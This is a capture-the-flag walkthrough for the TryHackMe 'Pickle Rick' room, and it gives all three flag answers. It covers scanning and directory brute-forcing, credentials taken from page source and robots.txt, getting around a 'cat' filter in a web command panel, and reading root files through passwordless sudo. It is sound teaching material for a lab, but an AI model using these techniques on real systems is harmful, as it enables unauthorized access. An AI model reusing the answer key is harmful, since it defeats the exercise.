# TryHackMe: Pickle Rick Walkthrough

This guide provides a structured walkthrough to complete the **Pickle Rick** room on TryHackMe. The objective is to exploit a web server to find three hidden ingredients to turn Rick back into a human.

---

## Challenge Summary
*   **Target:** Web Enumeration, Command Injection, Privilege Escalation
*   **Ingredient 1:** `mr. meeseeks hair`
*   **Ingredient 2:** `1 jerry tear`
*   **Ingredient 3:** `fleeb juice`

---

## Phase 1: Web Enumeration

### 1. Port Scanning
Run an **Nmap** scan against the target IP address to identify open ports and services:
```bash
nmap -sV <MACHINE_IP>
```
*   **Port 80 (HTTP):** Open (Web Server)
*   **Port 22 (SSH):** Open (Secure Shell)

### 2. Inspecting the Webpage Source
1. Navigate to `http://<MACHINE_IP>` in your browser.
2. Right-click the page and select **View Page Source**.
3. Look at the HTML comments at the bottom to find a hidden username:
   ```html
   <!-- Note to self: R1ckRul3s -->
   ```
   *   **Username:** `R1ckRul3s`

### 3. Checking robots.txt
Navigate to `http://<MACHINE_IP>/robots.txt`. You will see a single string text:
```text
Wubbalubbadubdub
```
*   **Potential Password:** `Wubbalubbadubdub`

### 4. Directory Brute-Forcing
Run **Gobuster** or **Dirb** to search for hidden web directories:
```bash
gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/common.txt
```
This scan reveals a login portal located at:
*   `/login.php`

---

## Phase 2: Finding the First Ingredient

### 1. Authentication
1. Go to `http://<MACHINE_IP>/login.php`.
2. Log in using the credentials gathered during Phase 1:
   *   **Username:** `R1ckRul3s`
   *   **Password:** `Wubbalubbadubdub`

### 2. Command Execution & Bypass
Once logged in, you will see a **Command Panel** that allows you to run Linux commands. 

1. List the files in the current directory:
   ```bash
   ls
   ```
   *   You will see a file named `Sup3rSecr3tPickl3Ingred.txt`.

2. The standard `cat` command is blocked by a server-side filter. Bypass this restriction by using alternative file-reading utilities like `less`, `tac`, or `grep`:
   ```bash
   less Sup3rSecr3tPickl3Ingred.txt
   ```

*   **Answer 1:** `mr. meeseeks hair`

---

## Phase 3: Finding the Second Ingredient

### 1. File System Exploration
Check the home directories of the system users via the Command Panel:
```bash
ls /home
```
Inside `/home`, you will find a folder for the user `rick`. List the contents of that folder:
```bash
ls /home/rick
```
*   You will see a file named `second ingredients`.

### 2. Reading the File
Because the filename contains a space, wrap the full file path inside double quotes and read it using `less`:
```bash
less "/home/rick/second ingredients"
```

*   **Answer 2:** `1 jerry tear`

---

## Phase 4: Finding the Third Ingredient

### 1. Privilege Escalation Check
Check the current web server user's (`www-data`) sudo privileges to see if you can run commands as root:
```bash
sudo -l
```
The output will show that the user can execute all commands with root privileges without requiring a password:
```text
(ALL : ALL) NOPASSWD: ALL
```

### 2. Accessing the Root Directory
Since you have unrestricted sudo permissions, list the contents of the root administrator directory:
```bash
sudo ls /root
```
*   You will see a file named `third.txt`.

### 3. Reading the Final Flag
Read the contents of the final file using your sudo access:
```bash
sudo less /root/third.txt
```

*   **Answer 3:** `fleeb juice`
